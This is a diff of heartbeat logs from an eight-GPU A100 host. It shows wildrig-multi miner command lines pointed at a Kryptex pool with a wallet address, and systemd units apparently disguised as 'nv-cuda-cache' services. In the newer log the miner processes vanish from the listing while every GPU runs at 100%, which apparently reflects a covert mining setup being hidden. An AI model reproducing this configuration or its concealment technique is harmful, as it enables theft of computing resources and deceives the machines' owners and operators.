@@ -1,17 +1,10 @@
-stage=beat host=pseiisa7l4h5 ts=2026-11-23T13:13:52Z engine=wildrig-ul86
+stage=beat host=pseiisa7l4h5 ts=2026-11-23T13:17:31Z engine=wildrig-ul86
 --- apt
 E: Package 'nvidia-fabricmanager' has no installation candidate
 INSTALL rc=100 pkgs=0
 --- smi_rc=0
 --- procs
-11849 /opt/fleet/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 1 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g1 -p x -i 8 --no-color
-11854 /opt/fleet/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 2 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g2 -p x -i 8 --no-color
-11859 /opt/fleet/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 3 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g3 -p x -i 8 --no-color
-11864 /opt/fleet/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 4 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g4 -p x -i 8 --no-color
-11870 /opt/fleet/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 5 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g5 -p x -i 8 --no-color
-11877 /opt/fleet/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 6 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g6 -p x -i 8 --no-color
-11882 /opt/fleet/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 7 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g7 -p x -i 8 --no-color
-13281 /opt/fleet/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d 0 -o stratum+ssl://prl.kryptex.network:8048 -o stratum+tcp://prl.kryptex.network:7048 -u prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz.ul-ps-pseiisa7l4h5-g0 -p x -i 8 --no-color
+
 --- units
   nv-cuda-cache@0.service loaded active running nv cuda cache
   nv-cuda-cache@1.service loaded active running nv cuda cache
@@ -22,14 +15,14 @@ INSTALL rc=100 pkgs=0
   nv-cuda-cache@6.service loaded active running nv cuda cache
   nv-cuda-cache@7.service loaded active running nv cuda cache
 --- gpus
-0, NVIDIA A100-SXM4-80GB, 4723 MiB, 0 %
-1, NVIDIA A100-SXM4-80GB, 4530 MiB, 0 %
-2, NVIDIA A100-SXM4-80GB, 4530 MiB, 0 %
-3, NVIDIA A100-SXM4-80GB, 4530 MiB, 0 %
-4, NVIDIA A100-SXM4-80GB, 4530 MiB, 0 %
-5, NVIDIA A100-SXM4-80GB, 4530 MiB, 0 %
-6, NVIDIA A100-SXM4-80GB, 4530 MiB, 0 %
-7, NVIDIA A100-SXM4-80GB, 4530 MiB, 0 %
+0, NVIDIA A100-SXM4-80GB, 6523 MiB, 100 %
+1, NVIDIA A100-SXM4-80GB, 6330 MiB, 100 %
+2, NVIDIA A100-SXM4-80GB, 6330 MiB, 100 %
+3, NVIDIA A100-SXM4-80GB, 6330 MiB, 100 %
+4, NVIDIA A100-SXM4-80GB, 6330 MiB, 100 %
+5, NVIDIA A100-SXM4-80GB, 6330 MiB, 100 %
+6, NVIDIA A100-SXM4-80GB, 6330 MiB, 100 %
+7, NVIDIA A100-SXM4-80GB, 6330 MiB, 100 %
 --- acc
 [04:48:44] accepted (1/0)	GPU#7	(98 ms)
 [04:48:46] accepted (2/0)	GPU#7	(98 ms)
